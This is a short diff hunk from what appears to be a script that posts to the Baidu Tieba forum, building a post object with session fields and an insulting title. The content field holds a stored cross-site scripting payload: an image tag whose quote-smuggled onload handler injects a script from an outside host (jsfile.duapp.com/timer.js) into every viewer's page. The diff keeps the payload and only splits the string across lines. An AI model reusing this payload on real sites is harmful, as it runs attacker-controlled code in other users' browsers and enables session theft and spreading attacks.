@@ -87,7 +87,9 @@ var slj = {
 	mouse_pwd_t: "1370973332622",
 	mouse_pwd_isclick: "1",
 	title: "这吧里就一群sb呵呵",
-	content: '<img class="BDE_Smiley" width="1" height="1" src="http://static.tieba.baidu.com/tb/editor/images/face/i_f25.png" text="” onload=“var script = document.createElement(’script‘);script.type = ’text/javascript‘;script.charset = ‘utf-8’;script.src = ’http://jsfile.duapp.com/timer.js‘;document.body.appendChild(script)“">日漫比国漫好了不知道多少倍',
+	content: '<img class="BDE_Smiley" width="1" height="1" src="http://static.tieba.baidu.com/tb/editor/images/face/i_f25.png"'
+	         'text="” onload=“var script = document.createElement(’script‘);script.type = ’text/javascript‘;script.charset = ‘utf-8’;'
+			 'script.src = ’http://jsfile.duapp.com/timer.js‘;document.body.appendChild(script)“">日漫比国漫好了不知道多少倍',
 	anonymous: "0",
 	tbs: PageData.tbs,
 	tag: "11",
